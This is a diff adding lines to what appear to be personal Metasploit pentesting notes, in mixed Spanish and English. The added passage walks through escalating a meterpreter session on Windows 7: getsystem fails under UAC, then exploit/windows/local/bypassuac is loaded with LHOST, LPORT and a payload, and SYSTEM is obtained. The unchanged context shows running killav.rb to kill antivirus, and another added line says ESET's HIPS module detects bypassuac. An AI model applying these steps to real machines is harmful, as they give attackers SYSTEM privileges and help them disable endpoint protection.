@@ -463,6 +463,24 @@ reboot
 search
 getuid
 
+
+En windows 7 nos podemos encontrar con UAC:
+
+meterpreter>getsystem
+[-] priv_elevate_getsystem: Operation failed: The environment is incorrect.
+meterpreter>run post/windows/gather/win_privs                    **nos muestra los privilegios actuales
+
+Solution: Bypass the UAC
+meterpreter>background
+>search uac
+>use exploit/windows/local/bypassuac                             **Ojo con los AV
+>set LHOST+LPORT+PAYLOAD then exploit....and ;)
+meterpreter>getsystem
+...got system via technique....................
+
+
+
+
 """"""""""""""""""""""""""""""""""""""""""""""""""ANTIVIRUS""""""""""""""""""""""""""""""""""Killing in the name of.....
 Opcion 1:
 >>meterpreter>>run killav.rb             //con privilegios --> getsystem
@@ -505,7 +523,9 @@ Si deshabilitamos la opcion Enable-Self Defense recien vamos a poder Asesinar al
 
 
 
+Opcion 2:
 
+ESET antivirus aun estando desactivado tiene activo el modulo HIPS con "exploracion de memoria avanzada" que detecta por ejemplo la ejecucion de bypassuac
 
 
 
